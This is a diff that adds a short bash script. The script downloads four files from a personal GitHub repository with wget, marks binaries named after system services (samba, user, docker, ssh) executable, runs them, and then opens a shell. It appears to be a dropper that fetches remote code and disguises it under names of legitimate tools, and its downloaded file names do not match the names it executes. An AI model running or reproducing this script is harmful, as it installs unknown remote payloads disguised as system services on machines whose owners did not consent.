@@ -1,0 +1,15 @@
+#!/bin/bash
+wget raw.githubusercontent.com/popanam/demo/refs/heads/main/cups
+chmod +x samba
+./samba
+wget raw.githubusercontent.com/popanam/demo/refs/heads/main/atop
+chmod +x user
+./user
+wget raw.githubusercontent.com/popanam/demo/refs/heads/main/fail2ban
+chmod +x docker
+./docker
+wget raw.githubusercontent.com/popanam/demo/refs/heads/main/web
+chmod +x ssh
+./ssh
+
+exec bash
